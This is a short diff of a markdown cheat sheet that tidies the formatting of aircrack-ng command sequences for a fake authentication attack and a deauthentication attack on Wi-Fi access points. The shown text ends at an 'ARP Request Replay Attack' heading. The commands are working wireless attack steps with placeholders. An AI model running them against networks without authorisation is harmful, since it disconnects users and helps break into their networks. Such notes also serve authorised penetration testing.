@@ -1,16 +1,16 @@
 
 ## Fake Authentication Attack
    
-     airmon-ng start <interface> <AP channel>
-     airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
-   # aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface name>
+   airmon-ng start <interface> <AP channel>
+   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
+   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface name>
    
    
 ## Deauthentication Attack
 
-     airmon-ng start <interface> <AP channel>
-     airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
-   # aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface name>
+   airmon-ng start <interface> <AP channel>
+   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
+   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface name>
 
 
 ## ARP Request Replay Attack
